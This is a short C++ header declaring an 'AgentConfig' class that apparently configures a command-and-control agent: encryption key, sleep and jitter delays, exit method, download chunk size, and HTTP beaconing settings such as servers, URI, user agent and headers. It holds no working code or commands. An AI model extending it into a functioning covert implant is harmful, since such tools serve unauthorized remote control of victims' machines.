#pragma once

#include <windows.h>

class AgentConfig
{
public:
	BOOL active;

	ULONG agent_type;
	BYTE* encrypt_key;
	ULONG sleep_delay;
	ULONG jitter_delay;

	BYTE  exit_method;
	ULONG exit_task_id;
	ULONG download_chunk_size;

	// HTTP Config
	WORD   port;
	ULONG  servers_count;
	BYTE** servers;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;

	AgentConfig();
};